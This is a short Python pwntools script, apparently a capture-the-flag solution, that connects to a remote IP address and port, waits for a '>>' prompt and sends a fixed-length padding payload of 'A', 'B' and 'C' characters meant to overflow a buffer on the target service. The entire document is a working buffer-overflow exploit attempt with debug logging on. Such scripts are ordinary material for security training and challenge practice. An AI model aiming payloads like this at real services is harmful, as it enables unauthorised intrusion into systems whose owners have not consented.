from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

ip, port ='167.99.200.95',32141
io = remote(ip, port)

payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC'
io.recvuntil('>>')
io.sendline(payload)
io.recvall()
